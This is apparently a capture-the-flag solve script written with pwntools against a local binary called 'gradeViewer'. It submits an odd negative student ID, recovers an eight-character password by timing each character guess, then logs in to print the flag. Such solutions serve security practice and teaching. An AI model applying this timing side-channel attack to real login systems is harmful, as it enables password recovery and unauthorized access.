from pwn import *
import time
import string

context.binary = './gradeViewer'

BINARY = './gradeViewer'
ID = b'-62482'
CHARSET = string.ascii_lowercase + string.digits

def time_guess(guess):
    io = process(BINARY)
    try:
        io.recvuntil(b"Enter your student ID: ")
        io.sendline(ID)

        io.recvuntil(b"Enter your password [a-z, 0-9]:")
        start = time.time()
        io.sendline(guess.encode())
        io.recvline()
        end = time.time()
    except:
        end = start + 0.001

    io.close()
    return end - start

def recover_password():
    password = ""
    for i in range(8):
        best = ''
        longest = 0
        for c in CHARSET:
            attempt = password + c + "0" * (7 - i)
            duration = time_guess(attempt)
            
            if duration > longest:
                longest = duration
                best = c
        password += best
        print(f"Current password: {password}")
    return password

def get_flag(pw):
    io = process(BINARY)
    io.recvuntil(b"Enter your student ID: ")
    io.sendline(ID)
    io.recvuntil(b"Enter your password [a-z, 0-9]:")
    io.sendline(pw.encode())
    print(io.recvall().decode())
    io.close()

if __name__ == "__main__":
    password = recover_password()
    get_flag(password)